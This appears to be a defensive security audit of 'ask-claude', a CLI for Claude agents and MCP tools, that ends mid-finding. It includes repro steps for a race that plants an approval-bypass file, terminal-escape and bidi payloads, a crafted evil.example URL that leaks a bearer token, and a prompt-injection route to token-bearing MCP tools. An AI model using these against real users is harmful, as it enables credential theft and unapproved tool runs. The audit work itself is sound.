title: State-dir gate checks only the leaf $STATE, once, so an account that controls a non-sticky ancestor of XDG_STATE_HOME can swap the vetted directory after the gate and plant .always.<pid>
description: The run-1 symlink, chmod and owner gaps are fixed (ask-claude:143-152), but the parent part of the same root cause remains. The gate vets only the leaf $STATE and only at startup; every later access re-resolves $STATE by name. This includes the 'always' grant, which is only the existence of $STATE/.always.$$ (ask-claude:523), checked before the no-tty deny (526-529). If an ancestor of $STATE is writable by another local account and lacks the sticky bit (the account owns XDG_STATE_HOME, or pre-created a predictable XDG_STATE_HOME such as /tmp/<name> that mkdir -p at 143 reuses silently), that account can rename the vetted directory after the gate, create its own directory under the same name, and create .always.<victim pid>. The pid is visible in ps, or the account can create the file for every pid. session_confirm then returns allow for every server agent.tool_use (ask-claude:730) and every --local-mcp custom tool call (752), with no prompt and even with no tty. sessions/ entries (901) and events.jsonl (177) are also written into the attacker's directory. v01 reproduced the swap independently with the same uid. An attacker process that runs separately from the victim's MCP server waited until the unmodified fake-server started, which is after the .always clear at 1113. It then renamed /scratch/shared/ask-claude (mode 0777 parent), created a replacement directory and planted .always.<pid>. With ASK_CLAUDE_CONFIRM=ask and stdin /dev/null, both get_weather calls printed 'allowed' and 'Sunny in Paris' was sent as user.custom_tool_result. In the control run without the swap, both calls were denied ('stdin is not a terminal'). The cross-account rename was not observed because the sandbox has a single uid.
claimed_root_cause: ask-claude:68 derives STATE from XDG_STATE_HOME. ask-claude:143 runs mkdir -p, which reuses existing ancestors of any owner and mode. ask-claude:144-152 checks only the leaf (symlink, chmod 700, owner uid, group/other write bits), and only once. No ancestor is checked for an owner other than the user or root, or for group/other write without the sticky bit. Every later use reopens the path by name: ALWAYS=$STATE/.always.$$ (1112), the [ -e "$ALWAYS" ] grant (523), $SESSIONS=$STATE/sessions (431, written at 901) and events.jsonl (177). So the startup verdict is not bound to the directory actually used. The leaf write-bit test at 150 runs after chmod 700, so it always passes for a directory the user owns and adds no parent protection.

trace.description: STATE="${XDG_STATE_HOME:-$HOME/.local/state}/ask-claude"; XDG_STATE_HOME may point under a directory another account owns or can write, such as a predictable /tmp/<name>
mkdir -p "$STATE" silently reuses an existing ancestor that another account owns or can write
the owner check (147-148), like the symlink (144), chmod (145) and write-bit (150-152) checks, applies only to the leaf and only at startup; there is no ancestor walk
ALWAYS="$STATE/.always.$$" is a path string; rm -f at 1113 clears it before a later swap, so the clear does not prevent a grant planted afterwards

[ -e "$ALWAYS" ] re-resolves the path through the possibly-substituted directory and returns allow before the no-tty deny at 526-529; reached for server agent.tool_use (730) and local custom tool calls (752)

evidence.description: mkdir -p with no check of the existing ancestors it reuses
owner uid compared for $STATE only
group/other write-bit test on $STATE only, after chmod 700; no parent or ancestor test
the always grant is the existence of a fixed-name file, reopened by path on every confirmation and checked before the tty check
local --local-mcp custom tool calls are gated by the same session_confirm, so a planted grant runs them on the user's machine
sessions/ state is written by path into whatever directory $STATE resolves to at that moment

blockers: The sandbox runs one uid (1000) with all capabilities dropped. The decisive cross-account step was simulated with the same uid and not observed: a second account renames a uid-1000-owned 0700 directory inside a non-sticky parent that the second account owns or can write, then creates a replacement. Linux rename(2) normally allows a same-parent directory rename with write+search on the parent alone, and the sticky bit blocks it, but this is unverified here.

Exploitability depends on a configuration fact outside the source: XDG_STATE_HOME, or an ancestor of it, must be writable by another local account without the sticky bit, or be a predictable path that another account can pre-create (for example /tmp/<name>). The default $HOME/.local/state, and XDG_STATE_HOME=/tmp itself (sticky), are not affected unless $HOME or its ancestors are misconfigured.

validation_plan.local: On a disposable, offline, multi-user Linux VM with dummy accounts A (victim) and B (attacker): as B, mkdir /tmp/ac-state && chmod 0777 /tmp/ac-state (no sticky bit). As A, from a checkout of the target with usage installed, run: XDG_STATE_HOME=/tmp/ac-state ANTHROPIC_API_KEY=sk-ant-test-not-a-key ASK_CLAUDE_CONFIRM=ask ASK_CLAUDE_REPLAY=tests/fixtures/sessions/custom-tool ASK_CLAUDE_REQUEST_LOG=/home/A/req.jsonl ./ask-claude agent --agent agent_FIXTURE --environment env_FIXTURE --local-mcp 'sleep 3; exec tests/fixtures/mcp/fake-server' hi </dev/null. During the 3 s sleep, as B, run: mv /tmp/ac-state/ask-claude /tmp/ac-state/x && mkdir /tmp/ac-state/ask-claude && touch /tmp/ac-state/ask-claude/.always.<pid of A's bash ask-claude from ps>. Expected if vulnerable: stderr shows 'ask-claude: allowed local get_weather' and req.jsonl carries user.custom_tool_result 'Sunny in Paris'. Control: the same run without B's step prints 'denied ... stdin is not a terminal'. Sticky control: chmod 1777 /tmp/ac-state, and B's mv must then fail with EPERM. Same-uid mechanics: agents/v01/artifacts/repro-output.txt (driver agents/v01/artifacts/drive.sh) and agents/h5-files-state/artifacts/checks-output.txt (check 5 vs control 5b). Regression for a fix: the gate must refuse any ancestor of $STATE owned by an account other than the user or root, or writable by group or other without the sticky bit (OpenSSH StrictModes style). Alternatively, bind the grant to the vetted directory, for example by keeping the always answer in a process-private location such as an exported variable or an fd opened at gate time, not by re-resolving $STATE.
validation_plan.deployment: The owner checks every machine or shared host where ask-claude runs for an XDG_STATE_HOME (or HOME) whose path has an ancestor that another local account owns or can write without the sticky bit, or that sits at a predictable path another account could pre-create, such as /tmp/<name>. Report the path and the owner and mode of each ancestor (namei -l "$XDG_STATE_HOME/ask-claude"). No audit traffic is sent anywhere.

title: Endpoint-supplied cost amount reaches the terminal raw through jq 1.7's tonumber error message, bypassing safe
description: The DOLLARS helper (ask-claude:161) converts the API's cost string with a bare tonumber. When the Managed Agents endpoint returns a non-numeric list_cost/max_list_cost amount, jq aborts the program before the trailing `| safe` runs. Under jq 1.7.x the error text written to stderr is `Invalid numeric literal ... (while parsing '<raw string>')` with the decoded string verbatim, so ESC/BEL/CSI/OSC bytes reach the user's terminal (title rewrite via OSC 0, colour/clear/forged text via CSI, OSC 52 clipboard writes where the terminal honours them). The expected status line is not printed. Three sinks: the session usage line after every `agent` turn (ask-claude:837-838), `agent list` (:940) and `agent budget` (:1058); none redirects jq's stderr. Under the pinned jq 1.8.2 the same error is printed JSON-escaped and truncated, so the leak depends on an older jq being first on PATH, which the script does not prevent (it checks only `command -v jq`). macOS 15 ships /usr/bin/jq 1.7.1-apple and Ubuntu 24.04 ships jq 1.7.1, and mise's pin applies only where mise is activated.
root_cause: safe is applied only to the success value of each status-line jq program. DOLLARS calls tonumber on an unvalidated endpoint string; jq 1.7 embeds the unparsed string raw in its error message, which jq prints on its own stderr, inherited by the terminal. lib/session-fold.jq:31 copies usage.list_cost.amount from the stream unchanged, and session_list/session_budget pass the GET /sessions and POST /sessions/<id> amounts straight to dollars. ask-claude:132 accepts any jq version.
intended_behavior: Every endpoint-controlled byte printed to the terminal passes the C0/C1/DEL filter (the contract stated at ask-claude:154-157 and lib/stream.jq:23-27). A malformed amount should render a placeholder such as '?' without a jq error.

trace.description: curl reads the session event stream from BASE_URL (lower-trust endpoint) into the log; the session.usage event is endpoint-controlled
usage.list_cost.amount from the last session.usage event is copied into .usage.list_cost without type or shape validation
def dollars: (tonumber / 100) ... bare tonumber on the raw string, no try/? guard
jq -r "$SAFE$DOLLARS" '.usage | ... (.list_cost | dollars) ... | safe' >&2; tonumber errors before safe and jq 1.7 writes the raw string to stderr

evidence.description: DOLLARS uses bare tonumber with no try/? guard and no shape check
safe is the last filter of the success path only; the jq has no stderr redirect
SAFE, the strongest visible control, is a jq filter on output values and cannot cover jq's own error stream
only `command -v jq` is checked; any jq version runs although mise.toml:3 pins 1.8.2
jq pinned to 1.8.2, under which the tonumber error is JSON-escaped and truncated (no leak); the pin is not enforced at runtime
Parallel path to the same unguarded dollars call (ma_call): GET /sessions and POST /sessions/<id> response bodies come from BASE_URL via curl
Parallel path to the same unguarded dollars call (session_list): (.usage.list_cost.amount // "0") | dollars on each listed session; same unguarded error channel
Parallel path to the same unguarded dollars call (session_budget): .budget.max_list_cost.amount | dollars on the budget update response; same unguarded error channel

conditions.description: The Managed Agents endpoint at BASE_URL (or a proxy/party that controls its responses or session stream) returns a non-numeric list_cost/max_list_cost amount containing control characters

A jq older than 1.8 is first on PATH when ask-claude runs (observed: sandbox jq 1.7 and macOS 15 /usr/bin/jq 1.7.1-apple both leak; the pinned jq 1.8.2 prints the value escaped as "\u001b..." and does not leak)
Effect depends on the terminal: OSC 0 titles and CSI colour/clear work in most terminals; OSC 52 clipboard writes only where enabled

execution.attacker_perspective: A malicious or compromised Managed Agents endpoint (lower-trust principal) answering a normal `ask-claude agent "..."`, `ask-claude agent list` or `ask-claude agent budget <sesn> <cents>` invocation by the local user
instructions: Create a replay directory with 1.sse (agent.message, the session.usage event above, session.status_idle end_turn), create.json {"id":"sesn_FIXTURE01","status":"running"}, sessions.json and update.json holding the payloads as JSON text with \u escapes (not raw bytes).

In the no-network sandbox (bash 5.2, jq 1.7) run `bash ask-claude` with ANTHROPIC_API_KEY=sk-ant-test-not-a-key, ASK_CLAUDE_REPLAY=<dir>, ASK_CLAUDE_EVENTS=off, usage_model=m usage_max_tokens=1000 usage_prompt=hi and usage_cmd=agent (plus usage_agent, usage_environment, usage_budget=100); repeat with usage_cmd='agent list', and with usage_cmd='agent budget' usage_session=sesn_A usage_cents=5. Capture stdout and stderr separately.
Inspect both streams with od -c and count 0x1b bytes; separately run `tonumber` on the same string with jq 1.8.2 to compare.
execution.observed_result: jq 1.7 sandbox: the agent turn printed `hello` on stdout and on stderr `jq: error (at <stdin>:1): Invalid numeric literal at line 1, column 2 (while parsing '<ESC>]0;V02-TITLE<BEL><ESC>[31mV02FORGED')` with 2 raw 0x1b bytes; the usage line was not printed (rc 0). `agent list` stderr carried <ESC>]0;V02-LIST<BEL><ESC>[31mX (2 ESC, rc 0); `agent budget` stderr carried <ESC>]52;c;VjAy<BEL> (1 ESC, rc 1). Stdout had 0 ESC in all runs. Host macOS /usr/bin/jq 1.7.1-apple shows the same raw echo for tonumber; pinned jq 1.8.2 prints `string ("\u001b]0;V02\u0007\u001b...") cannot be parsed as a number` with no raw control byte.

remediation.strategy: Make dollars total on any input so safe always runs: parse with `tonumber?` (or a numeric regex) and fall back to '?'. Optionally also send these status-line jq programs' stderr to /dev/null, and/or require jq >= 1.8 at startup. Regression test: a fold, a sessions page and a budget response whose amount is "\u001b[31mX" each print a line containing '?' and no 0x1b byte on either stream, under both jq 1.7 and 1.8.

code_changes.fixed_code: DOLLARS='def dollars: (tonumber? // null) as $n | if $n == null then "?" else ($n / 100) as $d | "$" + ($d | floor | tostring) + "." + (($d * 100 | round) % 100 | tostring | if length < 2 then "0" + . else . end) end; '

likelihood.reason: Requires a malicious or compromised Managed Agents endpoint/proxy (a principal that already controls reply text) and a pre-1.8 jq first on PATH; the pinned 1.8.2 does not leak, though common system jqs (macOS 15, Ubuntu 24.04) are 1.7.1 and the pin is not enforced outside a mise-activated shell

impact.reason: Terminal integrity only: title/colour/screen manipulation, forged text, OSC 52 clipboard writes where allowed; the real cost line is suppressed. No code execution or secret disclosure on this path alone

confidence.reason: All three sinks independently reproduced in the jq 1.7 sandbox with fresh fixtures; the jq-version dependence was measured directly (1.7 and 1.7.1-apple leak, 1.8.2 escapes), and every trace line was checked at 9c21790e

title: Tool confirmation prompt prints bidi overrides and zero-width characters raw and drops C1, so the rendered prompt can differ from the arguments that run
description: session_answer renders each tool input for the y/N/a prompt as `.input | tojson | safe` (ask-claude:729 for agent.tool_use, :751 for a local custom call). tojson escapes U+0000-U+001F and U+007F (DEL shows as the text \u007f) but leaves C1 (U+0080-U+009F) and every code point >= U+00A0 literal. safe then deletes C1 and keeps everything else. So Unicode format characters chosen by the endpoint or model (bidi embeddings/overrides U+202A-U+202E, isolates U+2066-U+2069, zero-width U+200B-U+200F) reach the prompt raw, while C1 characters in the executed arguments are silently removed from the prompt. Reproduced on the interactive path (ASK_CLAUDE_CONFIRM=ask, pty via script(1), user answered y): the prompt line `allow local get_weather {...}? [y/N/a(lways)]` carried raw U+202E, U+202C and U+200B and lacked U+0085, and the local MCP server then received tools/call arguments containing all four. On a terminal that applies bidi reordering, an input such as {"path":"/home/u/\u202etxt.hs\u202c"} would display as /home/u/sh.txt, so the user would approve a rendering that differs from the bytes executed on their machine (local custom tool) or by the session's server-side tool. Format characters are reordered or made invisible, never removed, and C1 characters are removed, so the deception is limited to reordering, invisible insertions and dropped C1 code points.
claimed_root_cause: The terminal-control sanitiser SAFE (ask-claude:157) is reused as the confirmation renderer. It is a deny-list of C0/DEL/C1 that deletes rather than escapes, and it has no rule for Unicode format (Cf) characters. The confirmation display (ask-claude:729, :751) does not escape non-ASCII or format characters, so the approved text is not an unambiguous encoding of the object later sent (ask-claude:677, :733).

trace.description: An agent.custom_tool_use event from the endpoint's SSE stream, whose id the idle event lists, is kept with its input object verbatim in .custom (the endpoint can fabricate this event without the model).
input=$(jq -r "$SAFE"'.input | tojson | safe'): U+202E, U+202C and U+200B pass through literally; U+0085 (C1) is deleted from the shown text; U+007F is escaped by tojson and shown as the text \u007f.

read -r -p prints 'allow local <name> <input>? [y/N/a(lways)]' (bash writes the read -p prompt to stderr when reading from a terminal) with the raw format characters; the answer is read from /dev/tty.
After 'allow', the unmodified $use .input is sent as tools/call params.arguments to the local MCP server, which runs with the user's uid.

evidence.description: SAFE keeps tab, LF and every code point >= 32 except 127 and 128-159; U+200B-U+200F, U+202A-U+202E and U+2066-U+2069 are kept, and C1 is deleted rather than escaped (DEL never reaches it in this pipeline because tojson already escaped it).
The agent.tool_use confirmation shows the input through the same `.input | tojson | safe` filter; :733 answers user.tool_confirmation for that id, so server-side tool calls share the root cause.
local_mcp_has only checks the tool name against the server's list; nothing constrains the characters in .input.
agent.tool_use inputs are kept verbatim in .asks, the source of the :729 display.

blockers: Whether the raw format characters change what the user sees depends on the user's terminal bidi implementation (for example VTE/GNOME Terminal with bidi on, Konsole, mlterm, iTerm2, Terminal.app) and font; the sandbox has no terminal renderer, so the visual reordering, and therefore an approval of a rendering that reads differently from the executed arguments, is not locally observable. Locally established only at byte level: on the real interactive prompt path U+202E/U+202C/U+200B are printed raw and U+0085 is dropped from the prompt while the local MCP server receives it.

validation_plan.local: Replay a one-turn Managed Agents stream (ASK_CLAUDE_REPLAY dir with 1.sse) containing agent.custom_tool_use {"id":"sevt_C1","name":"get_weather","input":{"path":"/home/u/\u202etxt.hs\u202c","note":"a\u200bb\u0085c"}} followed by session.status_idle requires_action with event_ids ["sevt_C1"]; run `bash ask-claude` with usage_cmd=agent, usage_local_mcp=tests/fixtures/mcp/fake-server, FAKE_MCP_LOG set, ASK_CLAUDE_CONFIRM=ask, under script -qec with 'y' fed after the prompt. Byte check (already passing in the sandbox): od -c of the prompt line shows 342 200 256 / 342 200 254 / 342 200 213 raw and no 302 205, while FAKE_MCP_LOG's tools/call shows 302 205. Fix check: after the fix the prompt shows the literal text \u202e, \u202c, \u200b and \u0085 and no raw bytes from the Cf or C1 ranges, and the shown text JSON-decodes to exactly the tools/call arguments.
validation_plan.deployment: Owner-observed, non-destructive, on the terminals the user actually uses (at minimum the default terminal on the user's OS plus any bidi-capable one in use, e.g. GNOME Terminal/VTE >= 0.58, Konsole, iTerm2, Terminal.app): run the same replay with ASK_CLAUDE_CONFIRM=ask and the fake server, answer n, and screenshot the prompt. Confirm if any in-use terminal renders the path as /home/u/sh.txt (or otherwise in an order that reads as a different argument from the logical bytes); reject as hardening if every in-use terminal shows the characters in logical order or as visible placeholders. Do not use a real tool or real paths.

title: Custom-tool round cap is skipped for any round that also carries an agent.tool_use confirmation
description: session_turn caps at 8 the custom-tool rounds the script answers by itself. It counts a requires_action round only when the fold has no agent.tool_use asks (ask-claude:828), but session_answer then runs every custom call in that round anyway (ask-claude:741-760). A session stream (the model, or the endpoint at BASE_URL, which can fabricate any event) that puts one agent.tool_use next to its agent.custom_tool_use calls in each requires_action keeps the counter at 0. With confirmations auto-answered (ASK_CLAUDE_CONFIRM=allow, or after an 'a(lways)' answer), the script sends tools/call to the --local-mcp server round after round until the stream stops by itself. The cap exists to stop that loop. Separately, no limit applies to the number of custom calls in one round, so even the intact cap bounds rounds, not executions.
root_cause: ask-claude:828 `[ "$(jq '.asks | length' <<<"$fold")" -gt 0 ] || rounds=$((rounds + 1))` exempts the whole round from the count when any ask is present. The rationale in the comment at :826-827 (confirmations are the user's) applies to the asks only, not to the custom calls in the same round, which session_answer still executes through session_confirm (:752) and local_mcp_call (:677).
intended_behavior: Every requires_action round that contains at least one agent.custom_tool_use counts toward the 8-round cap, whether or not it also contains agent.tool_use asks. A round that contains only asks can stay uncounted.

trace.description: The session event stream from BASE_URL (lower-trust: the model's output or the endpoint itself) is written to the log that the fold reads.
An agent.tool_use whose id is in the requires_action idle's event_ids goes into .asks.
An agent.custom_tool_use in the same event_ids goes into .custom in the same fold.
Because .asks is non-empty, rounds is not incremented, although .custom is also non-empty.
rounds stays 0, so the -le 8 check passes and session_answer is called again on every such round, with no other bound in the loop.
Each custom call goes through session_confirm, which returns allow without a prompt under ASK_CLAUDE_CONFIRM=allow or when the always-grant file exists.
tools/call with stream-chosen name (from the server's listed tools) and arguments is written to the local MCP server process, which runs with the user's privileges and environment.

evidence.description: The round counter advances only when .asks is empty.
The comment states the intent: custom tool calls answered by this script are capped.
The custom-call loop over .custom[] in session_answer runs whether or not asks are present; nothing in it limits the number of calls.
The cap check reads only the counter that line 828 skips.

conditions.description: Run with --local-mcp (agent subtree), and confirmations auto-answered: ASK_CLAUDE_CONFIRM=allow (the documented unattended mode) or an earlier 'a(lways)' answer in the same process. In ask mode with a tty every call is prompted; without a tty every call is denied.

The stream must list an agent.tool_use and an agent.custom_tool_use in the same requires_action idle. The endpoint at BASE_URL can fabricate this; whether the real Managed Agents API batches both kinds in one pause under a steered model was not observed. The paired agent.tool_use is itself auto-allowed, so it also runs in the session's container.

execution.attacker_perspective: A session stream (model output steered by injected content, or the endpoint at BASE_URL) that wants to keep invoking a local MCP tool after the script's 8-round limit.
payloads: Round N (N=1..20) SSE: data: {"id":"cu_N","input":{"city":"VN"},"name":"get_weather","type":"agent.custom_tool_use"} / data: {"id":"tu_N","input":{"command":"true"},"name":"bash","type":"agent.tool_use"} / data: {"id":"idle_N","stop_reason":{"event_ids":["cu_N","tu_N"],"type":"requires_action"},"type":"session.status_idle"}
instructions: Build two ASK_CLAUDE_REPLAY directories with 20 requires_action turn files and a 21st end_turn file: control has only the agent.custom_tool_use per turn; mixed has the custom call plus one agent.tool_use, both in event_ids.

Run bash ask-claude in the offline sandbox with usage_cmd=agent, usage_local_mcp=tests/fixtures/mcp/fake-server, ASK_CLAUDE_CONFIRM=allow, FAKE_MCP_LOG and ASK_CLAUDE_REQUEST_LOG set, once per directory.
Count tools/call lines in the fake server log and user.custom_tool_result entries in the request log.
execution.observed_result: Control: 8 tools/call reached the fake MCP server, 8 custom_tool_result bodies were posted, then '[stopped: requires_action after 9 custom tool rounds; interrupting]', exit 1. Mixed: 20 tools/call, 20 custom_tool_result and 20 tool_confirmation bodies; the cap never fired and the run ended normally (exit 0) at the end_turn idle the stream chose to send.

remediation.strategy: Count every requires_action round that has custom calls, whether or not asks are present; rounds with asks only can stay uncounted. Optionally also cap the number of custom calls answered per round.

code_changes.fixed_code:
# custom tool calls are answered by this script, so every round that has
      # any is capped; rounds of confirmations only are the user's
      [ "$(jq '.custom | length' <<<"$fold")" -eq 0 ] || rounds=$((rounds + 1))

likelihood.reason: Needs --local-mcp, unattended confirmation (allow or always), and a stream that pairs both call kinds in every pause; the endpoint can do this, a normal model run is not shown to.

impact.reason: Same-user scope: more executions of local tools the user already authorized as a class under auto-allow, plus more session spend. With the real API the session budget bounds spend; a malicious endpoint is not bound by it but already gets unbounded calls per round under the intact cap. The cap is a loop limit, not an authorization.

confidence.reason: Deterministic source logic at :828-830, independently reproduced offline against a control run with 20 rounds and a clean end_turn stop.

title: Per-host MCP token is attached to any --mcp host whose name folds to the same variable (mcp-example.com receives the mcp.example.com token)
description: Each --mcp server's bearer token comes from ASK_CLAUDE_MCP_TOKEN_<HOST>. The variable name is built by changing every character outside [A-Za-z0-9_] to '_' and upper-casing the result. That mapping is not injective, so different DNS hosts share one variable: mcp.example.com and mcp-example.com both read ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM, and api.mcp.example.com, api-mcp.example.com, api.mcp-example.com and api-mcp-example.com all read ASK_CLAUDE_MCP_TOKEN_API_MCP_EXAMPLE_COM. A user who keeps ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM exported for mcp.example.com (the setup README.md:18-21 documents) and runs --mcp https://mcp-example.com/... gets that token placed in the lookalike server's authorization_token in the request body sent to the Messages API, whose MCP connector presents it to the server at that url. The shared-token refusal at ask-claude:125 does not fire, because it checks only the shared ASK_CLAUDE_MCP_TOKEN. When both hosts are given together, both entries carry the same token and the same server name.
root_cause: lib/request.jq:53 looks up env["ASK_CLAUDE_MCP_TOKEN_" + (host | ascii_upcase | gsub("-"; "_"))], where host (lib/request.jq:40) has already changed every character outside [A-Za-z0-9_-] to '-'. ask-claude:118-121 derives the same lossy name. '.' and '-' therefore map to the same character, distinct hostnames resolve to one environment variable, and nothing records which exact host a token belongs to.
intended_behavior: A token configured for one MCP host is attached only to a URL whose parsed host is exactly that host (README.md:21: 'each server gets only its own'). Two different hosts never resolve to the same credential.

trace.description: Each user-supplied --mcp URL (usage_mcp) is iterated; line 114 checks only for an https:// prefix.
The bash side changes every character outside [A-Za-z0-9_] in the host to '_', so '.', '-' and '_' become indistinguishable in the variable name it reports.
jq folds the host with gsub("[^A-Za-z0-9_-]"; "-"), merging '.' and '-'.
The token is read from ASK_CLAUDE_MCP_TOKEN_ plus the upper-cased folded host with '-' turned into '_'; mcp.example.com and mcp-example.com both read ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM.
The entry for the lookalike URL gets authorization_token set to the other host's token, and the name (host) mcp-example-com, which duplicates the legitimate server's name.
The body is sent with curl to the Messages API, whose MCP connector presents authorization_token to the server at the entry's url.

evidence.description: The environment lookup key is derived from a lossy host encoding.
The host helper maps every character outside [A-Za-z0-9_-] to '-', merging '.' and '-'.
The bash side builds the same colliding variable name; the refusal at line 125 checks only the shared ASK_CLAUDE_MCP_TOKEN.
The documented contract is 'each server gets only its own'.

conditions.description: The user keeps ASK_CLAUDE_MCP_TOKEN_<HOST> exported (for example in a shell rc), the documented setup for a server they use.

The user passes --mcp with a URL whose host differs from the trusted host only where the trusted host has '.' and the lookalike has '-' (or vice versa), for example copied from attacker-written docs. Underscore variants fold too but are not valid DNS hostnames, so they are not a practical attack.

The attacker controls such a lookalike host (a separately registrable name such as mcp-example.com, or a dash-variant subdomain). The Anthropic MCP connector sends authorization_token as the bearer credential to the url; this is documented connector behavior, not exercised here.

execution.attacker_perspective: An attacker who owns mcp-example.com publishes instructions to use --mcp https://mcp-example.com/sse. The victim already has ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM exported for the real mcp.example.com server.
instructions: In the sandbox, run bash /target/ask-claude with ANTHROPIC_API_KEY=sk-ant-test-not-a-key, usage_model=m, usage_max_tokens=1000, usage_prompt=ping, ASK_CLAUDE_REPLAY=/target/tests/fixtures/sse/mcp.sse, ASK_CLAUDE_REQUEST_LOG=/scratch/req.jsonl, the token variable from the payload and no other token variable.
Set usage_mcp to each payload URL in turn, then read .mcp_servers from the request log with jq.
execution.observed_result: With only ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM set, --mcp https://mcp-example.com/sse produced mcp_servers=[{url:'https://mcp-example.com/sse', name:'mcp-example-com', authorization_token:'tok_FOR_mcp.example.com_ONLY'}] with exit 0. Listing mcp.example.com and mcp-example.com together gave both entries that token and the name mcp-example-com, exit 0. With only ASK_CLAUDE_MCP_TOKEN_API_MCP_EXAMPLE_COM set, api-mcp.example.com, api.mcp-example.com and api-mcp-example.com each received tok_ONLY_api.mcp.example.com. Not observed: whether the API accepts two servers with the same name, and the connector actually sending the token to the url.

remediation.strategy: Bind each token to the exact parsed host. Use an injective variable encoding (for example, '.' to '__' and '-' to '_D_', or hex of the lower-cased hostname), or keep an explicit host record (e.g. ASK_CLAUDE_MCP_HOST_<VAR>) and refuse a URL whose exact host does not match it. Refuse two --mcp URLs that produce the same server name or token variable. Regression test: with only ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM set, --mcp https://mcp-example.com/x carries no authorization_token, and mcp.example.com together with mcp-example.com exits 2.

code_changes.fixed_code:
# in the --mcp loop, after deriving h: refuse folded collisions
case " $mcp_vars " in *" ASK_CLAUDE_MCP_TOKEN_${h^^} "*) die "--mcp servers $v and an earlier one share the token variable ASK_CLAUDE_MCP_TOKEN_${h^^}" ;; esac
# and in lib/request.jq/ask-claude derive the variable injectively from the exact host, e.g. dots to '__' so mcp.example.com -> MCP__EXAMPLE__COM and mcp-example.com -> MCP_EXAMPLE__COM

likelihood.reason: The attacker must control a dot/dash lookalike of a host the victim holds a token for, and the victim must pass that URL to --mcp while the per-host token is exported.

impact.reason: The victim's bearer token for one MCP server is presented to the attacker's server, whose operator can then act with that credential within its scope.

confidence.reason: Token placement was independently observed in the request body the script builds for three hostname pairs; the only external step is the documented connector behavior of sending authorization_token to the listed url.

title: --mcp token variable comes from the text before the first ':' or '/', so https://mcp.example.com:443@evil.example/ carries the mcp.example.com token
description: Unlike --base-url (ask-claude:98), --mcp does not refuse '@' or user info. lib/request.jq:40 takes the host as the text after the scheme up to the first '/' or ':'. For https://mcp.example.com:x@evil.example/sse (or the port-looking https://mcp.example.com:443@evil.example/mcp) the derived host is mcp.example.com, while the RFC 3986 host is evil.example. mcp_token then attaches ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM to that entry as authorization_token, contrary to README.md:18-21 ('each server gets only its own'). Observed locally under replay: exit 0, the request body carries the URL with authorization_token tok_FOR_mcp.example.com_ONLY. A URL with user info but no ':' (https://mcp.example.com@evil.example/) does not match, because jq then reads the whole 'mcp.example.com@evil.example' as the host. The attacker must get the user to pass the crafted URL while the user has that server's token exported (user interaction). Whether the Anthropic MCP connector accepts a URL with user info and sends the bearer token to evil.example is provider behavior that is not observable offline.
claimed_root_cause: The authority is parsed by a string cut, not by URL parsing, and user info is not refused for --mcp. lib/request.jq:40 (def host: capture("^[a-z]+://(?<h>[^/:]+)")) stops at the ':' inside the user info, and lib/request.jq:53 builds the token variable name from that value. The bash mirror at ask-claude:118-120 makes the same cut but only feeds the variable names in the shared-token error message (ask-claude:126); it does not select the token.

trace.description: Each --mcp value only has to match https://*; a value containing '@' (user info) is accepted. The value comes from the user's argv, typically copied from a server's published instructions.
The whole space-joined usage_mcp is passed unchanged to lib/request.jq as --arg mcp.
For https://mcp.example.com:x@evil.example/sse, [^/:]+ stops at the ':' in the user info and yields mcp.example.com.
The lookup reads env ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM, the token for a different host than the URL's real host.
The entry with url https://mcp.example.com:x@evil.example/sse gets authorization_token set to the mcp.example.com token; the body is sent to the API at ask-claude:316.

evidence.description: def host: capture("^[a-z]+://(?<h>[^/:]+)").h ignores user info: the capture ends at the first ':' even when an '@' follows.
The per-host token variable name is derived from host, so the user-info prefix selects the token.
The sibling --base-url gate refuses any '@' for exactly this host-disagreement reason (comment at ask-claude:92-95); the --mcp loop at ask-claude:114 has no such check.
h=${h%%[/:]*}: the bash mirror cuts the same way; it only builds the names listed in the shared-token refusal message.
Documented contract: each server gets only its own ASK_CLAUDE_MCP_TOKEN_<HOST>.

blockers: Whether the Anthropic MCP connector accepts an https URL containing user info, and if so whether it connects to the RFC 3986 host (evil.example) and sends authorization_token as a bearer header, is provider behavior that cannot be observed offline. If the API rejects such URLs, the token never leaves Anthropic and the impact is nil.
Whether usage 7.3.0 passes such a --mcp value unchanged into usage_mcp is not established by the harness (usage is absent); source shows no URL validation in the #USAGE spec at ask-claude:16.

validation_plan.local: Done (v06, independent): with only ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM set, replay request logs show authorization_token attached for https://mcp.example.com:x@evil.example/sse and https://mcp.example.com:443@evil.example/mcp, and not for https://mcp.example.com@evil.example/sse, https://mcp.example.com.evil.example/sse or https://mcp.example.com#@evil.example/sse (agents/v06/artifacts/userinfo-binding.out). Remaining local step with usage 7.3.0 installed: run ask-claude --mcp 'https://mcp.example.com:443@evil.example/mcp' under ASK_CLAUDE_REPLAY and ASK_CLAUDE_REQUEST_LOG and confirm the same body. After a fix (refuse '@' in --mcp, or derive the host after the last '@' of the authority), the same run must exit 2 or omit the token.
validation_plan.deployment: Owner-observed, non-destructive: the owner runs a test MCP endpoint they control at host B (logging request headers) and sends one Messages request with mcp_servers [{type:url, url:'https://A-host:443@B-host/mcp', name:'t', authorization_token:'dummy-token-not-real'}] and the mcp-client beta. Check B's access log for an Authorization: Bearer dummy-token-not-real header (token leaks to B), or the API response for a URL rejection (no leak). Use only a dummy token.

title: --web and --mcp put third-party-retrievable content and every listed MCP server's whole token-bearing toolset in one Messages request, with no per-tool narrowing
description: A one-shot or chat request built with --web and --mcp (optionally -f) carries web_search and web_fetch with no allowed_domains, and one bare mcp_toolset per --mcp server, while mcp_servers carries the user's authorization_token for that server. The MCP connector runs these calls on Anthropic's side: in the replayed stream the mcp_tool_use and its mcp_tool_result arrive in the same response, so the client only prints '(mcp <server>)' after the call has already run. A client-side per-call confirmation like session_confirm on the agent paths is therefore structurally unavailable on this path; the only source-side control would be narrowing the toolset (which tools are enabled), and the source emits none. Content a third party controls (a fetched page, a search result, another MCP server's tool result) can therefore, if the model follows it, cause any tool on a token-bearing MCP server to run under the user's token without the user requesting that specific action, and the -f file contents in the first user message are available to place in such a call's arguments. A pause_turn reply is resent automatically up to 8 times with the same tools. The user does opt in to both capabilities with explicit flags, and the README 